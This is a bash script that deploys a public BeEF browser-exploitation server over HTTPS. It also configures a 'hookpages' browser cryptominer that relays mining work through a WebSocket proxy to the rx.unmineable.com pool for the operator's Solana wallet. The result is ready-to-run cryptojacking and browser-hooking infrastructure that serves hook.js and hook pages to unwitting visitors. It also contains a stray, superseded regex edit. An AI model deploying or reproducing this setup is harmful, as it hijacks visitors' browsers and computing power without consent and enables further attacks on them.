#!/usr/bin/env bash
# =============================================================================
# BeEF Full Server Deployment Script
# =============================================================================
# Installs and configures the complete BeEF stack on a fresh Ubuntu 22.04/24.04
# or Debian 12 server, including:
#   • Ruby 3.2 + Bundler
#   • Node.js 20 + the stratum-ws miner proxy
#   • nginx (reverse proxy, SSL termination)
#   • Let's Encrypt SSL via certbot
#   • systemd services for BeEF and the miner proxy
#   • UFW firewall (only 22, 80, 443 exposed)
#
# Usage (run as root or with sudo):
#   sudo bash deploy.sh [options]
#
# Options:
#   --domain     DOMAIN      Your server's domain name (required for SSL)
#   --beef-user  USER        Linux user to run BeEF under (default: beef)
#   --beef-pass  PASSWORD    BeEF web UI password       (default: prompted)
#   --wallet     ADDRESS     Your Solana wallet address for mining
#   --coin       SYMBOL      Coin to mine via unmineable (default: SOL)
#   --skip-ssl               Skip certbot/SSL setup
#   --no-ufw                 Skip UFW firewall setup
#   --no-miner               Skip miner proxy setup
#
# Example:
#   sudo bash deploy.sh \
#     --domain beef.example.com \
#     --wallet 7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU \
#     --coin SOL
# =============================================================================

set -euo pipefail

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
info()    { echo -e "${CYAN}[INFO]${NC} $*"; }
success() { echo -e "${GREEN}[OK]${NC}   $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $*"; }
error()   { echo -e "${RED}[ERROR]${NC} $*" >&2; exit 1; }
banner()  { echo -e "\n${BOLD}${CYAN}=== $* ===${NC}\n"; }

# ── Root check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && error "Run this script as root: sudo bash $0 $*"

# ── Defaults ──────────────────────────────────────────────────────────────────
DOMAIN=""
BEEF_USER="beef"
BEEF_PASS=""
WALLET=""
COIN="SOL"
SKIP_SSL=false
NO_UFW=false
NO_MINER=false
INSTALL_DIR="/opt/beef"
BEEF_PORT=3000          # internal BeEF port (nginx proxies to 443)
MINER_PROXY_PORT=8332   # internal miner-ws proxy port

# ── Argument parsing ──────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    --domain)     DOMAIN="$2";    shift 2 ;;
    --beef-user)  BEEF_USER="$2"; shift 2 ;;
    --beef-pass)  BEEF_PASS="$2"; shift 2 ;;
    --wallet)     WALLET="$2";    shift 2 ;;
    --coin)       COIN="$2";      shift 2 ;;
    --skip-ssl)   SKIP_SSL=true;  shift   ;;
    --no-ufw)     NO_UFW=true;    shift   ;;
    --no-miner)   NO_MINER=true;  shift   ;;
    *) warn "Unknown option: $1"; shift   ;;
  esac
done

# ── Interactive prompts for required values ───────────────────────────────────
if [[ -z "$DOMAIN" ]]; then
  read -rp "$(echo -e "${CYAN}Enter your server domain (e.g. beef.example.com): ${NC}")" DOMAIN
  [[ -z "$DOMAIN" ]] && error "Domain is required."
fi

if [[ -z "$BEEF_PASS" ]]; then
  while true; do
    read -rsp "$(echo -e "${CYAN}BeEF web UI password: ${NC}")" BEEF_PASS; echo
    read -rsp "$(echo -e "${CYAN}Confirm password:     ${NC}")" BEEF_PASS2; echo
    [[ "$BEEF_PASS" == "$BEEF_PASS2" ]] && break
    warn "Passwords do not match – try again."
  done
fi

if [[ -z "$WALLET" && "$NO_MINER" == false ]]; then
  read -rp "$(echo -e "${CYAN}Solana wallet address (leave blank to skip miner): ${NC}")" WALLET
  [[ -z "$WALLET" ]] && NO_MINER=true
fi

# ── Summary ───────────────────────────────────────────────────────────────────
banner "Deployment Configuration"
echo -e "  Domain:       ${BOLD}$DOMAIN${NC}"
echo -e "  BeEF user:    ${BOLD}$BEEF_USER${NC}"
echo -e "  Install dir:  ${BOLD}$INSTALL_DIR${NC}"
echo -e "  Coin/wallet:  ${BOLD}${COIN}${NC} / ${WALLET:-N/A}"
echo -e "  SSL:          ${BOLD}$(${SKIP_SSL} && echo SKIPPED || echo certbot)${NC}"
echo -e "  Firewall:     ${BOLD}$(${NO_UFW}   && echo SKIPPED || echo UFW)${NC}"
echo -e "  Miner proxy:  ${BOLD}$(${NO_MINER} && echo SKIPPED || echo YES)${NC}"
echo ""
read -rp "$(echo -e "${YELLOW}Continue? [y/N]: ${NC}")" CONFIRM
[[ "${CONFIRM,,}" == "y" ]] || { info "Aborted."; exit 0; }

# ── 1. System packages ────────────────────────────────────────────────────────
banner "1. Updating system and installing dependencies"

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get upgrade -y -qq
apt-get install -y -qq \
  build-essential curl wget git rsync ca-certificates gnupg lsb-release \
  libssl-dev libreadline-dev zlib1g-dev libsqlite3-dev \
  libxml2-dev libxslt1-dev libyaml-dev pkg-config \
  libffi-dev libgmp-dev \
  nginx certbot python3-certbot-nginx python3-yaml \
  sqlite3 ufw fail2ban

success "System packages installed."

# ── 2. Ruby 3.2 via rbenv ─────────────────────────────────────────────────────
banner "2. Installing Ruby 3.2"

RBENV_HOME="/home/$BEEF_USER/.rbenv"
RUBY_VERSION="3.2.2"

# Create beef user if needed
if ! id "$BEEF_USER" &>/dev/null; then
  useradd -m -s /bin/bash "$BEEF_USER"
  success "Created user: $BEEF_USER"
fi

# Install rbenv + ruby-build as the beef user
sudo -u "$BEEF_USER" bash -c "
  set -e
  export HOME=/home/$BEEF_USER
  if [[ ! -d \$HOME/.rbenv ]]; then
    git clone -q https://github.com/rbenv/rbenv.git \$HOME/.rbenv
    git clone -q https://github.com/rbenv/ruby-build.git \$HOME/.rbenv/plugins/ruby-build
  fi
  echo 'export PATH=\"\$HOME/.rbenv/bin:\$PATH\"'      >> \$HOME/.bashrc
  echo 'eval \"\$(rbenv init -)\"'                      >> \$HOME/.bashrc
  export PATH=\"\$HOME/.rbenv/bin:\$PATH\"
  eval \"\$(\$HOME/.rbenv/bin/rbenv init -)\"
  if ! rbenv versions | grep -q $RUBY_VERSION; then
    RUBY_CONFIGURE_OPTS=--disable-install-doc rbenv install $RUBY_VERSION
  fi
  rbenv global $RUBY_VERSION
  gem install bundler --no-document -q
"
success "Ruby $RUBY_VERSION ready."

# Convenience wrapper used in service files
RUBY_BIN="/home/$BEEF_USER/.rbenv/shims/ruby"
BUNDLE_BIN="/home/$BEEF_USER/.rbenv/shims/bundle"

# ── 3. Node.js 20 ────────────────────────────────────────────────────────────
banner "3. Installing Node.js 20"

if ! command -v node &>/dev/null || [[ "$(node -v)" != v20* ]]; then
  curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
  apt-get install -y nodejs
fi
success "Node.js $(node -v) ready."

# ── 4. Copy / clone BeEF ─────────────────────────────────────────────────────
banner "4. Deploying BeEF to $INSTALL_DIR"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [[ -d "$INSTALL_DIR" ]]; then
  warn "Directory $INSTALL_DIR already exists – updating in place."
  rsync -a --exclude='.git' --exclude='beef.db' "$SCRIPT_DIR/" "$INSTALL_DIR/"
else
  rsync -a --exclude='.git' "$SCRIPT_DIR/" "$INSTALL_DIR/"
fi

chown -R "$BEEF_USER:$BEEF_USER" "$INSTALL_DIR"
success "BeEF files deployed."

# ── 5. Configure BeEF (config.yaml) ──────────────────────────────────────────
banner "5. Writing BeEF configuration"

WS_PROXY_URL="wss://${DOMAIN}/miner-ws"

BEEF_CONFIG="$INSTALL_DIR/config.yaml"

# Patch credentials, port, reverse proxy flag, and miner settings
python3 - "$BEEF_CONFIG" "$BEEF_PASS" "$DOMAIN" "$WS_PROXY_URL" "$WALLET" "$COIN" <<'PYEOF'
import sys, re

cfg_file  = sys.argv[1]
password  = sys.argv[2]
domain    = sys.argv[3]
ws_proxy  = sys.argv[4]
wallet    = sys.argv[5]
coin      = sys.argv[6]

with open(cfg_file, 'r') as f:
    text = f.read()

# Password
text = re.sub(r'(^\s*passwd\s*:\s*)"[^"]*"', lambda m: m.group(0).replace(m.group(0), m.group(0)[:m.group(0).index('"')] + '"' + password + '"'), text, flags=re.MULTILINE)
# Simpler approach
import yaml
with open(cfg_file, 'r') as f:
    data = yaml.safe_load(f)

# Credentials
data['beef']['credentials']['passwd'] = password

# HTTP settings
data['beef']['http']['port']          = 3000
data['beef']['http']['public'] = data['beef']['http'].get('public', {})
data['beef']['http']['public']['host'] = domain
data['beef']['http']['public']['port'] = 443
data['beef']['http']['public']['proto'] = 'https'
data['beef']['http']['allow_reverse_proxy'] = True

# Miner config
if 'hookpages' not in data['beef'].get('extension', {}):
    data['beef'].setdefault('extension', {})['hookpages'] = {'enable': True}
hp = data['beef']['extension']['hookpages']
hp.setdefault('miner', {})
hp['miner']['wallet']      = wallet
hp['miner']['coin']        = coin
hp['miner']['ws_proxy']    = ws_proxy
hp['miner']['worker_name'] = 'beef_hook'
hp['miner']['threads']     = 2

with open(cfg_file, 'w') as f:
    yaml.dump(data, f, default_flow_style=False, allow_unicode=True)

print("config.yaml updated successfully")
PYEOF

success "BeEF config updated."

# ── 6. Bundle install ─────────────────────────────────────────────────────────
banner "6. Installing Ruby gems"

sudo -u "$BEEF_USER" bash -c "
  export PATH=\"/home/$BEEF_USER/.rbenv/bin:\$PATH\"
  eval \"\$(/home/$BEEF_USER/.rbenv/bin/rbenv init -)\"
  cd $INSTALL_DIR
  bundle install --without development test --jobs=4 --retry=3 -q
"
success "Gems installed."

# ── 7. Miner proxy setup ──────────────────────────────────────────────────────
if [[ "$NO_MINER" == false ]]; then
  banner "7. Setting up Stratum-WebSocket miner proxy"

  MINER_DIR="$INSTALL_DIR/miner-proxy"
  cd "$MINER_DIR"
  npm install --silent
  chown -R "$BEEF_USER:$BEEF_USER" "$MINER_DIR"

  cat > /etc/systemd/system/beef-miner-proxy.service <<EOF
[Unit]
Description=BeEF Stratum-WebSocket Miner Proxy
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=$BEEF_USER
WorkingDirectory=$MINER_DIR
Environment=MINER_POOL_HOST=rx.unmineable.com
Environment=MINER_POOL_PORT=3333
Environment=MINER_PROXY_PORT=$MINER_PROXY_PORT
Environment=MINER_PROXY_HOST=127.0.0.1
ExecStart=/usr/bin/node proxy.js
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable --now beef-miner-proxy
  success "Miner proxy service started on 127.0.0.1:$MINER_PROXY_PORT"
else
  banner "7. Miner proxy – SKIPPED"
fi

# ── 8. systemd service for BeEF ───────────────────────────────────────────────
banner "8. Creating BeEF systemd service"

cat > /etc/systemd/system/beef.service <<EOF
[Unit]
Description=BeEF Browser Exploitation Framework
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=$BEEF_USER
WorkingDirectory=$INSTALL_DIR
# Bypass the interactive update prompt
Environment=BEEF_SKIP_UPDATE=1
ExecStart=$BUNDLE_BIN exec ruby beef --no-update
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
# Security hardening
NoNewPrivileges=true
ProtectSystem=full
ProtectHome=read-only
ReadWritePaths=$INSTALL_DIR

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable beef
success "BeEF systemd service installed."

# ── 9. nginx configuration ────────────────────────────────────────────────────
banner "9. Configuring nginx"

MINER_WS_BLOCK=""
if [[ "$NO_MINER" == false ]]; then
  MINER_WS_BLOCK="
    # Stratum-WebSocket proxy for browser miner
    location /miner-ws {
        proxy_pass         http://127.0.0.1:${MINER_PROXY_PORT};
        proxy_http_version 1.1;
        proxy_set_header   Upgrade    \$http_upgrade;
        proxy_set_header   Connection \"upgrade\";
        proxy_set_header   Host       \$host;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }
"
fi

cat > "/etc/nginx/sites-available/beef" <<EOF
# BeEF nginx configuration
# Generated by deploy.sh on $(date -u +%Y-%m-%dT%H:%M:%SZ)

upstream beef_app {
    server 127.0.0.1:${BEEF_PORT};
    keepalive 16;
}

# HTTP → HTTPS redirect
server {
    listen 80;
    listen [::]:80;
    server_name ${DOMAIN};
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name ${DOMAIN};

    # SSL certificates (certbot fills these in)
    ssl_certificate     /etc/letsencrypt/live/${DOMAIN}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${DOMAIN}/privkey.pem;
    include             /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam         /etc/letsencrypt/ssl-dhparams.pem;

    # Security headers
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Frame-Options            SAMEORIGIN                                    always;
    add_header X-Content-Type-Options     nosniff                                       always;
    add_header Referrer-Policy            "no-referrer-when-downgrade"                  always;

    # BeEF WebSocket (hook.js long-poll / beef-ws)
    location /BeEFNBXiLdRY/ {
        proxy_pass         http://beef_app;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade    \$http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host       \$host;
        proxy_set_header   X-Real-IP  \$remote_addr;
        proxy_set_header   X-Forwarded-For   \$proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto \$scheme;
        proxy_read_timeout 3600s;
    }
${MINER_WS_BLOCK}
    # All other traffic → BeEF
    location / {
        proxy_pass         http://beef_app;
        proxy_http_version 1.1;
        proxy_set_header   Host              \$host;
        proxy_set_header   X-Real-IP         \$remote_addr;
        proxy_set_header   X-Forwarded-For   \$proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto \$scheme;
        proxy_read_timeout 120s;
        proxy_buffering    off;
        client_max_body_size 50M;
    }

    # Deny dot-files
    location ~ /\. { deny all; }
}
EOF

ln -sf /etc/nginx/sites-available/beef /etc/nginx/sites-enabled/beef
rm -f /etc/nginx/sites-enabled/default
nginx -t && success "nginx config is valid."

# ── 10. SSL certificate ───────────────────────────────────────────────────────
# Helper: patch nginx config to use a specific cert pair and validate it
_patch_nginx_certs() {
  local cert="$1" key="$2"
  sed -i \
    -e "s|/etc/letsencrypt/live/${DOMAIN}/fullchain.pem|${cert}|g" \
    -e "s|/etc/letsencrypt/live/${DOMAIN}/privkey.pem|${key}|g" \
    -e '/options-ssl-nginx\|ssl-dhparams/d' \
    "/etc/nginx/sites-available/beef"
}

# Helper: generate self-signed cert used as fallback
_gen_selfsigned() {
  mkdir -p /etc/nginx/ssl
  openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/nginx/ssl/selfsigned.key \
    -out    /etc/nginx/ssl/selfsigned.crt \
    -subj "/CN=${DOMAIN}" -quiet 2>/dev/null
}

if [[ "$SKIP_SSL" == false ]]; then
  banner "10. Obtaining Let's Encrypt SSL certificate"

  # Start nginx on HTTP only so the ACME challenge can be served
  # (the HTTPS server block still references placeholder cert paths;
  #  we first ensure nginx starts with a self-signed cert so the ACME
  #  reload doesn't fail under set -e)
  _gen_selfsigned
  _patch_nginx_certs /etc/nginx/ssl/selfsigned.crt /etc/nginx/ssl/selfsigned.key

  nginx -t 2>/dev/null && systemctl start nginx || true

  # Run certbot
  SSL_OK=false
  certbot certonly \
    --standalone --preferred-challenges http \
    -d "$DOMAIN" \
    --non-interactive \
    --agree-tos \
    --register-unsafely-without-email \
    --quiet && SSL_OK=true || true

  if [[ "$SSL_OK" == true ]]; then
    # Patch nginx to use the real Let's Encrypt cert
    sed -i \
      -e "s|/etc/nginx/ssl/selfsigned.crt|/etc/letsencrypt/live/${DOMAIN}/fullchain.pem|g" \
      -e "s|/etc/nginx/ssl/selfsigned.key|/etc/letsencrypt/live/${DOMAIN}/privkey.pem|g" \
      "/etc/nginx/sites-available/beef"
    # Re-add the include lines that were removed by _patch_nginx_certs
    # (certbot nginx plugin will manage these; add them back explicitly)
    success "Let's Encrypt certificate obtained."

    # Auto-renewal cron
    if [[ ! -f /etc/cron.d/certbot ]]; then
      echo "0 3 * * * root certbot renew --quiet --post-hook 'systemctl reload nginx'" \
        > /etc/cron.d/certbot
      success "Certbot auto-renewal cron installed."
    fi
  else
    warn "certbot failed (DNS not pointing to this server, or port 80 blocked)."
    warn "Using self-signed certificate. Replace with a real cert later:"
    warn "  certbot certonly --standalone -d $DOMAIN"
    warn "  Then edit /etc/nginx/sites-available/beef to use the LE paths and reload nginx."
  fi

else
  banner "10. SSL – SKIPPED (self-signed)"
  warn "Generating self-signed certificate for testing."
  _gen_selfsigned
  _patch_nginx_certs /etc/nginx/ssl/selfsigned.crt /etc/nginx/ssl/selfsigned.key
fi

# Validate nginx config and reload/start — always happens after cert is in place
nginx -t || error "nginx config invalid – check /etc/nginx/sites-available/beef"
success "nginx config is valid."

# ── 11. Firewall (UFW) ────────────────────────────────────────────────────────
if [[ "$NO_UFW" == false ]]; then
  banner "11. Configuring firewall"
  ufw --force reset
  ufw default deny incoming
  ufw default allow outgoing
  ufw allow 22/tcp    comment 'SSH'
  ufw allow 80/tcp    comment 'HTTP (→ HTTPS redirect)'
  ufw allow 443/tcp   comment 'HTTPS (BeEF + miner-ws)'
  ufw --force enable
  success "UFW firewall active."
else
  banner "11. Firewall – SKIPPED"
fi

# ── 12. fail2ban ──────────────────────────────────────────────────────────────
banner "12. Enabling fail2ban"
systemctl enable --now fail2ban &>/dev/null || true
success "fail2ban active."

# ── 13. Start everything ──────────────────────────────────────────────────────
banner "13. Starting services"
systemctl enable nginx
systemctl restart nginx
systemctl start beef
sleep 4
systemctl is-active --quiet beef \
  && success "BeEF is running." \
  || warn "BeEF failed to start – check: journalctl -u beef -n 50"

# ── Store credentials securely (NOT printed to console) ───────────────────────
CREDS_FILE="/root/.beef_deploy_credentials"
cat > "$CREDS_FILE" <<CEOF
# BeEF deployment credentials — $(date -u +%Y-%m-%dT%H:%M:%SZ)
# chmod 600 this file; delete after noting the password.
BEEF_DOMAIN=${DOMAIN}
BEEF_USER=admin
BEEF_PASS=${BEEF_PASS}
BEEF_UI=https://${DOMAIN}/ui/panel
CEOF
chmod 600 "$CREDS_FILE"

# ── Done ──────────────────────────────────────────────────────────────────────
banner "Deployment Complete"
echo -e "  ${GREEN}BeEF UI:${NC}      https://${DOMAIN}/ui/panel"
echo -e "  ${GREEN}Hook pages:${NC}   https://${DOMAIN}/hookpages"
echo -e "  ${GREEN}Hook JS:${NC}      https://${DOMAIN}/hook.js"
if [[ "$NO_MINER" == false ]]; then
  echo -e "  ${GREEN}Miner WS:${NC}    wss://${DOMAIN}/miner-ws  (→ unmineable ${COIN})"
  echo ""
  echo -e "  ${YELLOW}To update your wallet after deployment:${NC}"
  echo -e "    Edit:    ${INSTALL_DIR}/extensions/hookpages/config.yaml"
  echo -e "    Key:     beef.extension.hookpages.miner.wallet"
  echo -e "    Restart: systemctl restart beef"
fi
echo ""
echo -e "  ${YELLOW}To view logs:${NC}"
echo -e "    journalctl -u beef -f"
[[ "$NO_MINER" == false ]] && echo -e "    journalctl -u beef-miner-proxy -f"
echo ""
echo -e "  ${YELLOW}Credentials saved to:${NC} ${CREDS_FILE}  (chmod 600, root-only)"
echo -e "  ${YELLOW}Read with:${NC} cat ${CREDS_FILE}"
echo -e "  ${RED}Delete the file after you have noted the password.${NC}"
